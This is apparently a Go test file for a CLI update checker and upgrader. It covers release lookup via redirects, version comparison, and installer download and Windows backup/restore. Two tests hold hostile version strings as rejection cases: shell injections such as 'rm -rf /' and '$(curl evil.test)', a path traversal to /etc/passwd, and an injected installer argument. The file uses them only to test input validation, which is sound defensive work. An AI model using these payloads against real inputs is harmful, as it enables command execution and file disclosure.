// SPDX-FileCopyrightText: Copyright (c) 2026, NVIDIA CORPORATION & AFFILIATES. All rights reserved.
// SPDX-License-Identifier: Apache-2.0

package updatecheck

import (
	"bytes"
	"context"
	"errors"
	"io"
	"net/http"
	"net/http/httptest"
	"net/url"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"sync/atomic"
	"testing"
)

// Verifies the tag and the release page URL both come out of the redirect,
// without the page itself ever being fetched.
func TestLatest(t *testing.T) {
	var gotMethod, gotPath string
	var pageRequests int
	server := redirectServer(t, "v1.4.0", func(r *http.Request) {
		gotMethod, gotPath = r.Method, r.URL.Path
		if strings.Contains(r.URL.Path, releaseTagSegment) {
			pageRequests++
		}
	})

	release, err := Checker{ReleasesURL: server.URL + "/releases"}.Latest(context.Background())
	if err != nil {
		t.Fatalf("Latest failed: %v", err)
	}

	if gotMethod != http.MethodHead {
		t.Fatalf("expected a HEAD request, got %s", gotMethod)
	}
	if gotPath != "/releases/latest" {
		t.Fatalf("unexpected path %q", gotPath)
	}
	if pageRequests != 0 {
		t.Fatalf("expected the redirect not to be followed, got %d page requests", pageRequests)
	}
	if release.Version != "v1.4.0" {
		t.Fatalf("unexpected version %q", release.Version)
	}
	if want := server.URL + "/releases/tag/v1.4.0"; release.URL != want {
		t.Fatalf("release URL = %q, want %q", release.URL, want)
	}
}

// Verifies a relative Location header resolves against the request URL.
func TestLatestRelativeRedirect(t *testing.T) {
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		w.Header().Set("Location", "/releases/tag/v1.4.0")
		w.WriteHeader(http.StatusFound)
	}))
	defer server.Close()

	release, err := Checker{ReleasesURL: server.URL + "/releases"}.Latest(context.Background())
	if err != nil {
		t.Fatalf("Latest failed: %v", err)
	}
	if release.Version != "v1.4.0" || release.URL != server.URL+"/releases/tag/v1.4.0" {
		t.Fatalf("unexpected release %#v", release)
	}
}

func TestLatestErrors(t *testing.T) {
	tests := []struct {
		name     string
		status   int
		location string
		wantErr  string
	}{
		// A repository with no release redirects to its release index, where the
		// REST API would have answered 404.
		{name: "no release", status: http.StatusFound, location: "/releases", wantErr: "no published release"},
		{name: "empty tag", status: http.StatusFound, location: "/releases/tag/", wantErr: "no published release"},
		{name: "no redirect", status: http.StatusOK, wantErr: "expected a redirect, got status 200"},
		{name: "not found", status: http.StatusNotFound, wantErr: "expected a redirect, got status 404"},
		{name: "no location", status: http.StatusFound, wantErr: "redirect has no Location"},
	}

	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
				if test.location != "" {
					w.Header().Set("Location", test.location)
				}
				w.WriteHeader(test.status)
			}))
			defer server.Close()

			if _, err := (Checker{ReleasesURL: server.URL}).Latest(context.Background()); err == nil ||
				!strings.Contains(err.Error(), test.wantErr) {
				t.Fatalf("expected error containing %q, got %v", test.wantErr, err)
			}
		})
	}
}

// Verifies a named release resolves to its own page without following the
// latest-release permalink.
func TestRelease(t *testing.T) {
	var gotMethod, gotPath string
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		gotMethod, gotPath = r.Method, r.URL.Path
		w.WriteHeader(http.StatusOK)
	}))
	defer server.Close()

	checker := Checker{ReleasesURL: server.URL + "/releases"}
	// The "v" is optional: a user reads the bare number off `version` output.
	for _, requested := range []string{"v1.1.0", "1.1.0", "V1.1.0"} {
		release, err := checker.Release(context.Background(), requested)
		if err != nil {
			t.Fatalf("Release(%q) failed: %v", requested, err)
		}
		if gotMethod != http.MethodHead {
			t.Fatalf("expected a HEAD request, got %s", gotMethod)
		}
		if gotPath != "/releases/tag/v1.1.0" {
			t.Fatalf("unexpected path %q for %q", gotPath, requested)
		}
		if release.Version != "v1.1.0" {
			t.Fatalf("Release(%q).Version = %q", requested, release.Version)
		}
		if want := server.URL + "/releases/tag/v1.1.0"; release.URL != want {
			t.Fatalf("release URL = %q, want %q", release.URL, want)
		}
	}
}

// Verifies an unpublished version is refused, and says so in a way the user can
// act on: this is the error behind `upgrade --version` on a typo.
func TestReleaseNotFound(t *testing.T) {
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		w.WriteHeader(http.StatusNotFound)
	}))
	defer server.Close()

	_, err := Checker{ReleasesURL: server.URL}.Release(context.Background(), "9.9.9")
	if !errors.Is(err, ErrReleaseNotFound) {
		t.Fatalf("expected ErrReleaseNotFound, got %v", err)
	}
	for _, want := range []string{"v9.9.9", releasesPage} {
		if !strings.Contains(err.Error(), want) {
			t.Fatalf("error missing %q: %v", want, err)
		}
	}
}

// Verifies a malformed version fails without a network call, and an unexpected
// status is not mistaken for a published release.
func TestReleaseErrors(t *testing.T) {
	requests := 0
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		requests++
		w.WriteHeader(http.StatusInternalServerError)
	}))
	defer server.Close()

	checker := Checker{ReleasesURL: server.URL}
	for _, requested := range []string{"", "  ", "latest", "1.x.0"} {
		if _, err := checker.Release(context.Background(), requested); err == nil {
			t.Fatalf("expected %q to be rejected", requested)
		}
	}
	if requests != 0 {
		t.Fatalf("expected a malformed version not to reach the network, got %d requests", requests)
	}

	_, err := checker.Release(context.Background(), "1.1.0")
	if err == nil || !strings.Contains(err.Error(), "unexpected status 500") {
		t.Fatalf("expected the status to surface, got %v", err)
	}
}

// Verifies a version that is not purely a version is refused before it can
// reach a URL or the installer's argument list.
//
// parseVersion is not a sufficient check on its own: it drops build metadata
// before parsing and does not constrain prerelease identifiers, so every input
// below parses as a valid semantic version. Only the tag allowlist stops them.
func TestReleaseTagRejectsHostileVersions(t *testing.T) {
	hostile := []string{
		"1.0.0-;rm -rf /",
		"1.0.0-$(curl evil.test)",
		"1.0.0-`id`",
		"1.0.0-\"; evil; \"",
		"1.0.0+../../../../etc/passwd",
		"1.0.0-../../foo",
		"1.0.0-a\nb",
		"1.0.0- --install-dir=/tmp/evil",
		"1.0.0-a b",
	}

	for _, version := range hostile {
		if _, err := parseVersion(version); err != nil {
			t.Fatalf("precondition: %q was expected to parse as a version, got %v", version, err)
		}
		tag, err := ReleaseTag(version)
		if err == nil {
			t.Fatalf("ReleaseTag(%q) returned %q, want a rejection", version, tag)
		}
	}

	// The tags releases actually carry must still be accepted.
	for _, version := range []string{"1.2.3", "v1.2.3", "V1.2.3", "1.2.3-rc.1", "1.2.3+build.7", "1.2"} {
		if _, err := ReleaseTag(version); err != nil {
			t.Fatalf("ReleaseTag(%q) failed: %v", version, err)
		}
	}
}

// Verifies a tag read off the wire is held to the same shape as one the user
// asked for: it too ends up as an argument to the installer.
func TestLatestRejectsHostileTag(t *testing.T) {
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		w.Header().Set("Location", "/releases/tag/v1.0.0-%24%28curl%20evil.test%29")
		w.WriteHeader(http.StatusFound)
	}))
	defer server.Close()

	_, err := Checker{ReleasesURL: server.URL}.Latest(context.Background())
	if err == nil || !strings.Contains(err.Error(), "is not a release tag") {
		t.Fatalf("expected a hostile tag to be refused, got %v", err)
	}
}

func TestIsSame(t *testing.T) {
	tests := []struct {
		a, b string
		want bool
	}{
		{a: "v1.2.0", b: "1.2.0", want: true},
		{a: "v1.2.0+build.7", b: "v1.2.0", want: true},
		{a: "v1.2", b: "v1.2.0", want: true},
		{a: "v1.2.0", b: "v1.2.1"},
		{a: "v1.2.0-rc.1", b: "v1.2.0"},
	}

	for _, test := range tests {
		got, err := IsSame(test.a, test.b)
		if err != nil {
			t.Fatalf("IsSame(%q, %q) failed: %v", test.a, test.b, err)
		}
		if got != test.want {
			t.Fatalf("IsSame(%q, %q) = %v, want %v", test.a, test.b, got, test.want)
		}
	}

	if _, err := IsSame("dev", "1.0.0"); err == nil {
		t.Fatal("expected an unparseable version to error")
	}
}

func TestCheck(t *testing.T) {
	server := redirectServer(t, "v1.4.0", nil)
	checker := Checker{ReleasesURL: server.URL}

	tests := []struct {
		name    string
		current string
		want    bool
	}{
		// goreleaser injects the bare number while the tag carries the "v".
		{name: "older", current: "1.3.9", want: true},
		{name: "older with prefix", current: "v1.3.9", want: true},
		{name: "current", current: "1.4.0"},
		{name: "prerelease of the same version", current: "1.4.0-rc.1", want: true},
		{name: "newer", current: "2.0.0"},
	}

	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			result, err := Check(context.Background(), checker, test.current)
			if err != nil {
				t.Fatalf("Check failed: %v", err)
			}
			if result.Available != test.want {
				t.Fatalf("Available = %v, want %v", result.Available, test.want)
			}
			if result.Version != "v1.4.0" {
				t.Fatalf("unexpected latest version %q", result.Version)
			}
		})
	}
}

// Serves the latest-release permalink the way github.com does: a redirect to
// the release's own page. observe, when set, sees every request the server gets,
// including a followed redirect the checker was supposed to stop at.
func redirectServer(t *testing.T, tag string, observe func(*http.Request)) *httptest.Server {
	t.Helper()

	var base string
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if observe != nil {
			observe(r)
		}
		if strings.Contains(r.URL.Path, releaseTagSegment) {
			_, _ = w.Write([]byte("release page"))
			return
		}
		w.Header().Set("Location", base+releaseTagSegment+tag)
		w.WriteHeader(http.StatusFound)
	}))
	base = server.URL
	t.Cleanup(server.Close)
	return server
}

// Verifies a non-release build short-circuits before any network call.
func TestCheckSkipsDevBuild(t *testing.T) {
	requests := 0
	server := httptest.NewServer(http.HandlerFunc(func(_ http.ResponseWriter, _ *http.Request) {
		requests++
	}))
	defer server.Close()

	result, err := Check(context.Background(), Checker{ReleasesURL: server.URL}, "dev")
	if err != nil {
		t.Fatalf("Check failed: %v", err)
	}
	if result.Available || result.Version != "" {
		t.Fatalf("expected an empty result, got %#v", result)
	}
	if requests != 0 {
		t.Fatalf("expected no request for a dev build, got %d", requests)
	}
}

func TestIsNewer(t *testing.T) {
	tests := []struct {
		candidate string
		current   string
		want      bool
	}{
		{candidate: "v1.0.1", current: "v1.0.0", want: true},
		{candidate: "v1.1.0", current: "v1.0.9", want: true},
		{candidate: "v2.0.0", current: "v1.99.99", want: true},
		{candidate: "v1.0.0", current: "v1.0.0"},
		{candidate: "v1.0.0", current: "v1.0.1"},
		// Numeric prerelease identifiers compare numerically, not lexically, so
		// rc.10 outranks rc.9 rather than sorting before it.
		{candidate: "v1.0.0-rc.10", current: "v1.0.0-rc.9", want: true},
		{candidate: "v1.0.0-rc.9", current: "v1.0.0-rc.10"},
		{candidate: "v1.0.0", current: "v1.0.0-rc.8", want: true},
		{candidate: "v1.0.0-rc.8", current: "v1.0.0"},
		{candidate: "v1.0.0-beta", current: "v1.0.0-alpha", want: true},
		{candidate: "v1.0.0-rc.1.1", current: "v1.0.0-rc.1", want: true},
		// Build metadata is not part of precedence.
		{candidate: "v1.0.0+build.9", current: "1.0.0"},
		// Short forms fill missing components with zero.
		{candidate: "v1.1", current: "v1.0.9", want: true},
		{candidate: "v1", current: "v1.0.0"},
	}

	for _, test := range tests {
		t.Run(test.candidate+" vs "+test.current, func(t *testing.T) {
			got, err := IsNewer(test.candidate, test.current)
			if err != nil {
				t.Fatalf("IsNewer failed: %v", err)
			}
			if got != test.want {
				t.Fatalf("IsNewer(%q, %q) = %v, want %v", test.candidate, test.current, got, test.want)
			}
		})
	}
}

func TestIsReleaseVersion(t *testing.T) {
	valid := []string{"1.0.0", "v1.0.0", "v1.0.0-rc.1", "v1.0.0+build", "1.2", "1"}
	invalid := []string{"", "dev", "unknown", "v", "1.2.3.4", "1.x.0", "v1.0.0-", "v-1.0.0"}

	for _, value := range valid {
		if !IsReleaseVersion(value) {
			t.Fatalf("expected %q to parse as a release version", value)
		}
	}
	for _, value := range invalid {
		if IsReleaseVersion(value) {
			t.Fatalf("expected %q not to parse as a release version", value)
		}
	}
}

func TestNotice(t *testing.T) {
	result := Result{Release: Release{Version: "v1.4.0", URL: "https://example.test/v1.4.0"}, Available: true}

	notice := Notice(result, "1.0.0")
	for _, want := range []string{"Update available: v1.4.0 (current v1.0.0)", "https://example.test/v1.4.0", "Upgrade: "} {
		if !strings.Contains(notice, want) {
			t.Fatalf("notice missing %q: %q", want, notice)
		}
	}

	result.Available = false
	if notice := Notice(result, "1.4.0"); notice != "" {
		t.Fatalf("expected no notice when up to date, got %q", notice)
	}
}

func TestReleaseLookupsRejectInvalidRequests(t *testing.T) {
	var requests atomic.Int64
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		requests.Add(1)
		w.WriteHeader(http.StatusOK)
	}))
	defer server.Close()

	cancelled, cancel := context.WithCancel(context.Background())
	cancel()
	lookups := []struct {
		name string
		call func(context.Context, Checker) (Release, error)
	}{
		{"Latest", func(ctx context.Context, checker Checker) (Release, error) { return checker.Latest(ctx) }},
		{"Release", func(ctx context.Context, checker Checker) (Release, error) { return checker.Release(ctx, "1.2.3") }},
	}
	cases := []struct {
		name      string
		ctx       context.Context
		url       string
		cancelled bool
	}{
		{"malformed URL", context.Background(), "://bad", false},
		{"cancelled context", cancelled, server.URL, true},
	}
	for _, lookup := range lookups {
		for _, tc := range cases {
			t.Run(lookup.name+"/"+tc.name, func(t *testing.T) {
				got, err := lookup.call(tc.ctx, Checker{ReleasesURL: tc.url, HTTPClient: server.Client()})
				if err == nil {
					t.Error("expected an error")
				}
				if tc.cancelled && !errors.Is(err, context.Canceled) {
					t.Errorf("error = %v, want context.Canceled", err)
				}
				if got != (Release{}) {
					t.Errorf("release = %+v, want zero value", got)
				}
				if got := requests.Load(); got != 0 {
					t.Errorf("server received %d requests, want none", got)
				}
			})
		}
	}
}

func TestCheckRejectsUnparseablePublishedTag(t *testing.T) {
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		w.Header().Set("Location", "/releases/tag/v1.x.0")
		w.WriteHeader(http.StatusFound)
	}))
	defer server.Close()

	got, err := Check(context.Background(), Checker{ReleasesURL: server.URL + "/releases", HTTPClient: server.Client()}, "1.0.0")
	if err == nil {
		t.Error("Check succeeded with an unparseable published tag")
	}
	if got != (Result{}) {
		t.Errorf("result = %+v, want zero value", got)
	}
}

func TestLatestRejectsMalformedLocation(t *testing.T) {
	requests := make(chan struct{ method, path string }, 1)
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		requests <- struct{ method, path string }{r.Method, r.URL.Path}
		w.Header().Set("Location", "/releases/tag/%zz")
		w.WriteHeader(http.StatusMultipleChoices)
	}))
	defer server.Close()

	got, err := (Checker{ReleasesURL: server.URL + "/releases", HTTPClient: server.Client()}).Latest(context.Background())
	if err == nil || !strings.Contains(err.Error(), "release lookup failed") {
		t.Errorf("Latest error = %v, want release lookup failed", err)
	}
	if got != (Release{}) {
		t.Errorf("release = %+v, want zero value", got)
	}
	select {
	case request := <-requests:
		if request.method != http.MethodHead || request.path != "/releases/latest" {
			t.Errorf("request = %s %s, want HEAD /releases/latest", request.method, request.path)
		}
	default:
		t.Error("server did not receive the latest-release request")
	}
}

func TestNumericPrereleaseIdentifiersWithDifferentFormattingCompareEqual(t *testing.T) {
	for _, versions := range [][2]string{
		{"1.0.0-01", "1.0.0-1"},
		{"1.0.0-1", "1.0.0-01"},
	} {
		t.Run(versions[0]+"_and_"+versions[1], func(t *testing.T) {
			same, err := IsSame(versions[0], versions[1])
			if err != nil || !same {
				t.Errorf("IsSame(%q, %q) = %t, %v; want true, nil", versions[0], versions[1], same, err)
			}
			newer, err := IsNewer(versions[0], versions[1])
			if err != nil || newer {
				t.Errorf("IsNewer(%q, %q) = %t, %v; want false, nil", versions[0], versions[1], newer, err)
			}
		})
	}
}

func TestIsNewerVersionBoundaries(t *testing.T) {
	cases := []struct {
		name, candidate, current string
		want                     bool
		wantError                bool
	}{
		{"numeric before alphanumeric", "1.0.0-1", "1.0.0-alpha", false, false},
		{"alphanumeric after numeric", "1.0.0-alpha", "1.0.0-1", true, false},
		{"alpha before beta", "1.0.0-alpha", "1.0.0-beta", false, false},
		{"beta after alpha", "1.0.0-beta", "1.0.0-alpha", true, false},
		{"invalid candidate", "invalid", "1.0.0", false, true},
		{"invalid current", "1.0.0", "invalid", false, true},
		{"numeric component out of range", "99999999999999999999.0.0", "1.0.0", false, true},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			got, err := IsNewer(tc.candidate, tc.current)
			if (err != nil) != tc.wantError {
				t.Errorf("error = %v, want error = %t", err, tc.wantError)
			}
			if got != tc.want {
				t.Errorf("IsNewer(%q, %q) = %t, want %t", tc.candidate, tc.current, got, tc.want)
			}
		})
	}
}

func TestDisplayVersionBoundaries(t *testing.T) {
	for _, tc := range []struct{ input, want string }{
		{" \t\n", "unknown"},
		{" V1.2.3 ", "V1.2.3"},
	} {
		t.Run(tc.want, func(t *testing.T) {
			if got := DisplayVersion(tc.input); got != tc.want {
				t.Errorf("DisplayVersion(%q) = %q, want %q", tc.input, got, tc.want)
			}
		})
	}
}

func TestInstallerRequestsRejectMalformedURL(t *testing.T) {
	const invalidURL = "://bad"
	plan := UpgradePlan{InstallerURL: invalidURL}
	for _, tc := range []struct {
		name string
		call func() error
	}{
		{"availability", func() error { return plan.CheckInstallerAvailable(context.Background()) }},
		{"download", func() error {
			_, err := downloadInstaller(context.Background(), invalidURL)
			return err
		}},
	} {
		t.Run(tc.name, func(t *testing.T) {
			err := tc.call()
			var parseErr *url.Error
			if !errors.As(err, &parseErr) {
				t.Fatalf("error = %v, want *url.Error from malformed URL", err)
			}
			if parseErr.Op != "parse" || parseErr.URL != invalidURL {
				t.Errorf("URL error = %+v, want parse failure for %q", parseErr, invalidURL)
			}
		})
	}
}

func TestInstallerRequestsHonorCancelledContext(t *testing.T) {
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		w.WriteHeader(http.StatusOK)
	}))
	defer server.Close()

	ctx, cancel := context.WithCancel(context.Background())
	cancel()
	const version = "v1.2.3"
	plan := UpgradePlan{InstallerURL: server.URL, Release: Release{Version: version}}
	if err := plan.CheckInstallerAvailable(ctx); !errors.Is(err, context.Canceled) || !strings.Contains(err.Error(), version) {
		t.Errorf("CheckInstallerAvailable error = %v, want cancellation identifying %s", err, version)
	}
	if _, err := downloadInstaller(ctx, server.URL); !errors.Is(err, context.Canceled) || !strings.Contains(err.Error(), "could not download the installer") {
		t.Errorf("downloadInstaller error = %v, want cancellation identifying the download failure", err)
	}
}

func TestUpgradePlanRunTruncatedDownloadPreservesExecutable(t *testing.T) {
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		w.Header().Set("Content-Length", "100")
		_, _ = io.WriteString(w, "short installer")
	}))
	defer server.Close()

	dir := t.TempDir()
	executable := filepath.Join(dir, "nvfleetint")
	original := []byte("original executable bytes")
	if err := os.WriteFile(executable, original, 0o700); err != nil {
		t.Fatal(err)
	}
	plan := UpgradePlan{InstallerURL: server.URL, ExecutablePath: executable, InstallDir: dir}
	var progress bytes.Buffer
	err := plan.Run(context.Background(), &progress)
	if !errors.Is(err, io.ErrUnexpectedEOF) || !strings.Contains(err.Error(), "could not download the installer") {
		t.Errorf("Run error = %v, want truncated download error", err)
	}
	got, err := os.ReadFile(executable)
	if err != nil {
		t.Fatalf("read executable after failed download: %v", err)
	}
	if !bytes.Equal(got, original) {
		t.Errorf("executable changed: got %q, want %q", got, original)
	}
	if progress.Len() != 0 {
		t.Errorf("installer progress = %q, want empty", progress.String())
	}
}

func TestUpgradePlanRunWindowsMoveFailure(t *testing.T) {
	if runtime.GOOS != "windows" {
		t.Skip("requires Windows executable move behavior; not executed on this platform")
	}

	var requests atomic.Int64
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		requests.Add(1)
		_, _ = io.WriteString(w, "installer body")
	}))
	defer server.Close()

	dir := t.TempDir()
	executable := filepath.Join(dir, "missing.exe")
	plan := UpgradePlan{InstallerURL: server.URL, ExecutablePath: executable, InstallDir: dir}
	var progress bytes.Buffer
	err := plan.Run(context.Background(), &progress)
	if !errors.Is(err, os.ErrNotExist) || !strings.Contains(err.Error(), "could not move the running executable aside") {
		t.Errorf("Run error = %v, want missing executable move failure", err)
	}
	if got := requests.Load(); got != 1 {
		t.Errorf("installer requests = %d, want 1", got)
	}
	if progress.Len() != 0 {
		t.Errorf("progress = %q, want empty", progress.String())
	}
	for _, path := range []string{executable, executable + ".old"} {
		if _, err := os.Stat(path); !errors.Is(err, os.ErrNotExist) {
			t.Errorf("stat %q error = %v, want not exist", path, err)
		}
	}
}

func TestRestoreWindowsBinaryMissingBackup(t *testing.T) {
	dir := t.TempDir()
	backup := filepath.Join(dir, "missing-backup")
	executable := filepath.Join(dir, "missing-executable")
	err := restoreWindowsBinary(backup, executable)
	if !errors.Is(err, os.ErrNotExist) || !strings.Contains(err.Error(), "could not restore the original executable") {
		t.Errorf("restoreWindowsBinary error = %v, want missing backup restoration error", err)
	}
	if _, err := os.Stat(executable); !errors.Is(err, os.ErrNotExist) {
		t.Errorf("executable stat error = %v, want not exist", err)
	}
}

func TestUpgradeStagingAndWindowsMoveSafety(t *testing.T) {
	dir := t.TempDir()
	executable := filepath.Join(dir, "nvfleetint.exe")
	original := []byte("original executable bytes")
	plan := UpgradePlan{ExecutablePath: executable, InstallDir: dir, Release: Release{Version: "v1.2.3"}}

	if runtime.GOOS != "windows" {
		if err := os.WriteFile(executable, original, 0o700); err != nil {
			t.Fatal(err)
		}
		invalidTemp := filepath.Join(dir, "not-a-directory")
		if err := os.WriteFile(invalidTemp, []byte("file"), 0o600); err != nil {
			t.Fatal(err)
		}
		var requests atomic.Int64
		server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
			requests.Add(1)
			_, _ = io.WriteString(w, "installer body")
		}))
		defer server.Close()
		plan.InstallerURL = server.URL
		t.Setenv("TMPDIR", invalidTemp)
		var progress bytes.Buffer
		err := plan.Run(context.Background(), &progress)
		if err == nil || !strings.Contains(err.Error(), "could not create a temporary directory") {
			t.Errorf("Run error = %v, want temporary directory creation failure", err)
		}
		if got := requests.Load(); got != 1 {
			t.Errorf("installer requests = %d, want 1", got)
		}
		got, err := os.ReadFile(executable)
		if err != nil {
			t.Fatal(err)
		}
		if !bytes.Equal(got, original) {
			t.Errorf("executable = %q, want %q", got, original)
		}
		if progress.Len() != 0 {
			t.Errorf("progress = %q, want empty", progress.String())
		}
		return
	}

	if _, err := plan.moveRunningBinaryAside(); err == nil || !strings.Contains(err.Error(), "could not move the running executable aside") {
		t.Errorf("move missing executable error = %v, want move failure", err)
	}
	backup := executable + ".old"
	if err := os.WriteFile(executable, original, 0o700); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(backup, []byte("stale backup"), 0o600); err != nil {
		t.Fatal(err)
	}
	moved, err := plan.moveRunningBinaryAside()
	if err != nil {
		t.Fatal(err)
	}
	if _, err := os.Stat(executable); !errors.Is(err, os.ErrNotExist) {
		t.Errorf("moved executable stat error = %v, want not exist", err)
	}
	got, err := os.ReadFile(backup)
	if err != nil || !bytes.Equal(got, original) {
		t.Errorf("backup = %q, error = %v, want %q", got, err, original)
	}
	if err := moved.restore(); err != nil {
		t.Fatal(err)
	}
	got, err = os.ReadFile(executable)
	if err != nil || !bytes.Equal(got, original) {
		t.Errorf("restored executable = %q, error = %v, want %q", got, err, original)
	}
	if err := os.WriteFile(executable, []byte("fresh executable"), 0o700); err != nil {
		t.Fatal(err)
	}
	moved, err = plan.moveRunningBinaryAside()
	if err != nil {
		t.Fatal(err)
	}
	moved.discard()
	if _, err := os.Stat(backup); !errors.Is(err, os.ErrNotExist) {
		t.Errorf("discarded backup stat error = %v, want not exist", err)
	}

	script := filepath.Join(dir, "installer script.ps1")
	args := plan.installerCommand(context.Background(), script).Args
	want := []string{"powershell.exe", "-NoProfile", "-ExecutionPolicy", "Bypass", "-File", script, "-Version", plan.Release.Version, "-InstallDir", dir, "-NoModifyPath"}
	if len(args) != len(want) {
		t.Errorf("installer arguments = %q, want %q", args, want)
	} else {
		for i := range want {
			if args[i] != want[i] {
				t.Errorf("installer argument %d = %q, want %q", i, args[i], want[i])
			}
		}
	}
	if got := installerName(); got != "install.ps1" {
		t.Errorf("installerName() = %q, want install.ps1", got)
	}
}

func TestRound2UpgradeRunWindowsRestoreFailure(t *testing.T) {
	if runtime.GOOS != "windows" {
		t.Skip("requires Windows executable move and restore behavior")
	}

	dir := t.TempDir()
	executable := filepath.Join(dir, "nvfleetint.exe")
	original := []byte("original executable bytes")
	if err := os.WriteFile(executable, original, 0o700); err != nil {
		t.Fatalf("write original executable: %v", err)
	}

	// PowerShell single-quoted strings escape an apostrophe by doubling it.
	quotedPath := strings.ReplaceAll(executable, "'", "''")
	script := "$ErrorActionPreference = 'Stop'\n" +
		"$target = '" + quotedPath + "'\n" +
		"[void][IO.Directory]::CreateDirectory($target)\n" +
		"[IO.File]::WriteAllText([IO.Path]::Combine($target, 'child'), 'replacement')\n" +
		"exit 1\n"
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		_, _ = io.WriteString(w, script)
	}))
	defer server.Close()

	plan := UpgradePlan{
		Release:        Release{Version: "v1.2.3"},
		ExecutablePath: executable,
		InstallDir:     dir,
		InstallerURL:   server.URL,
	}
	var progress bytes.Buffer
	err := plan.Run(context.Background(), &progress)
	if err == nil {
		t.Fatal("Run succeeded, want installer and restore failures")
	}
	for _, want := range []string{
		"the installer failed",
		"additionally failed to restore the original executable",
		"could not remove the failed replacement executable",
	} {
		if !strings.Contains(err.Error(), want) {
			t.Errorf("Run error = %v, want %q", err, want)
		}
	}

	backup, err := os.ReadFile(executable + ".old")
	if err != nil {
		t.Fatalf("read original backup: %v", err)
	}
	if !bytes.Equal(backup, original) {
		t.Errorf("backup = %q, want %q", backup, original)
	}
	info, err := os.Stat(executable)
	if err != nil {
		t.Fatalf("stat replacement directory: %v", err)
	}
	if !info.IsDir() {
		t.Fatalf("replacement at %q is not a directory", executable)
	}
	child, err := os.ReadFile(filepath.Join(executable, "child"))
	if err != nil {
		t.Fatalf("read replacement child: %v", err)
	}
	if string(child) != "replacement" {
		t.Errorf("replacement child = %q, want %q", child, "replacement")
	}
}
